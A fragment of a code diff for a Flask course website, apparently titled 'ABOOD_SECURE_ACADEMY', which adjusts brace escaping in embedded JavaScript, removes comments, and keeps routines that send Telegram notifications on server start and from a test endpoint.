-                }
-                if (e.ctrlKey && e.shiftKey && (e.key === 'S' || e.key === 's')) {
+                }}
+                if (e.ctrlKey && e.shiftKey && (e.key === 'S' || e.key === 's')) {{
                     e.preventDefault();
                     document.getElementById('supportModal').style.display = 'flex';
-                }
-            });
+                }}
+            }});
             
             console.log('%c◼ ABOOD_SECURE_ACADEMY ◼', 'color: #00ff41; font-size: 20px;');
             console.log('الدعم الفني: @SSSTlF عبود');
@@ -1195,13 +847,11 @@ def get_course(course_id):
 
 @app.route('/api/notify')
 def notify():
-    """端点 لاختبار الإشعارات"""
     message = "🔔 <b>اختبار الإشعار</b>\n\nتم إرسال هذا الإشعار من API"
     result = send_telegram_notification(message)
     return jsonify({"status": "sent", "result": result})
 
 if __name__ == '__main__':
-    # إرسال إشعار عند تشغيل الخادم
     try:
         message = f"""🚀 <b>تم تشغيل الخادم!</b>
 
@@ -1212,7 +862,6 @@ if __name__ == '__main__':
 ⏰ <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 ✅ النظام جاهز للعمل"""
-        
         send_telegram_notification(message)
     except Exception as e:
         print(f"خطأ في إرسال إشعار التشغيل: {e}")
